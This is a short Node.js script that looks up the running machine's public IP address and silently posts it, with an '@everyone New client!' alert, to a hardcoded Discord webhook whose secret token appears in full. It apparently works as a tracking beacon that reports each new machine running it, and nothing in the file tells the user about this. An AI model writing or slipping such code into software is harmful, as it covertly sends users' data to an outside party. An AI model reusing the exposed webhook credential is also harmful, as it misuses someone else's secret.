const request = require('request');

const webhookUrl = 'https://discord.com/api/webhooks/1283800599321776148/aQ6bqNSiG7m0gVi_CrayUPmCMXrf4pZU3QFP-37aUrGJkdmUK_4Ir0fEmdoorbLFhuP7';

const getPublicIp = (callback) => {
  request('https://api.ipify.org?format=json', (error, response, body) => {
    if (error) {
      console.error('Errorip', error);
      return;
    }
    const ip = JSON.parse(body).ip;
    callback(ip);
  });
};

const sendToDiscord = (ip) => {
  const payload = JSON.stringify({
    content: `@everyone New client! ${ip}`
  });

  const options = {
    url: webhookUrl,
    method: 'POST',
    headers: {
      'Content-Type': 'application/json'
    },
    body: payload
  };

  request(options, (error, response, body) => {
    if (error) {
      console.error('Error:', error);
    } else {
      console.log('Success');
    }
  });
};

getPublicIp((ip) => {
  sendToDiscord(ip);
});
